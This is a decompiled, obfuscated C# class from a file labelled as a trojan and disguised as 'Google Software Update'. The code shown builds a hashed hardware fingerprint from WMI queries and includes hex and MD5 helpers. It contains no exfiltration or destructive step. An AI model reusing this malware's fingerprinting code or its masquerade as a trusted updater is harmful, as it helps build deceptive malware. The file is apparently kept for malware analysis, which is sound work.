// Decompiled with JetBrains decompiler
// Type: C3904355907.C252678980
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using System;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace C3904355907
{
  public class C252678980
  {
    public static string C3554254475()
    {
      StringBuilder stringBuilder = new StringBuilder();
      foreach (ManagementObject managementObject in new ManagementObjectSearcher(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cU(), DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cu()).Get())
      {
        stringBuilder.Append(managementObject[DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cV()]);
        stringBuilder.Append(managementObject[DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cv()]);
        stringBuilder.Append(managementObject[DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cW()]);
        stringBuilder.Append(managementObject[DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cw()]);
      }
      foreach (ManagementObject managementObject in new ManagementObjectSearcher(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cU(), DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cX()).Get())
      {
        stringBuilder.Append(managementObject[DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cx()]);
        stringBuilder.Append(managementObject[DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cW()]);
        stringBuilder.Append(managementObject[DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cY()]);
      }
      foreach (ManagementObject managementObject in new ManagementObjectSearcher(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cU(), DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cy()).Get())
        stringBuilder.Append(managementObject[DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cZ()]);
      return BitConverter.ToString(new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(stringBuilder.ToString()))).ToLower().Replace(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cg(), DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz());
    }

    private static string C3554254475([In] string obj0) => C252678980.C3554254475(new MD5CryptoServiceProvider().ComputeHash(new ASCIIEncoding().GetBytes(obj0)));

    private static string C3554254475([In] byte[] obj0)
    {
      string str1 = string.Empty;
      for (int index = 0; index < obj0.Length; ++index)
      {
        int num1 = (int) obj0[index];
        int num2 = num1 & 15;
        int num3 = num1 >> 4 & 15;
        string str2 = num3 <= 9 ? str1 + num3.ToString() : str1 + ((char) (num3 - 10 + 65)).ToString();
        str1 = num2 <= 9 ? str2 + num2.ToString() : str2 + ((char) (num2 - 10 + 65)).ToString();
        if (index + 1 != obj0.Length && (index + 1) % 2 == 0)
          str1 += DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cg();
      }
      return str1;
    }

    private static string C3554254475([In] string obj0, [In] string obj1)
    {
      string str = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz();
      try
      {
        foreach (ManagementObject instance in new ManagementClass(obj0).GetInstances())
        {
          if (str == DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz())
          {
            try
            {
              str = instance[obj1].ToString();
              break;
            }
            catch (Exception ex)
            {
              str = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.DA();
            }
          }
        }
      }
      catch (Exception ex)
      {
      }
      return str;
    }
  }
}
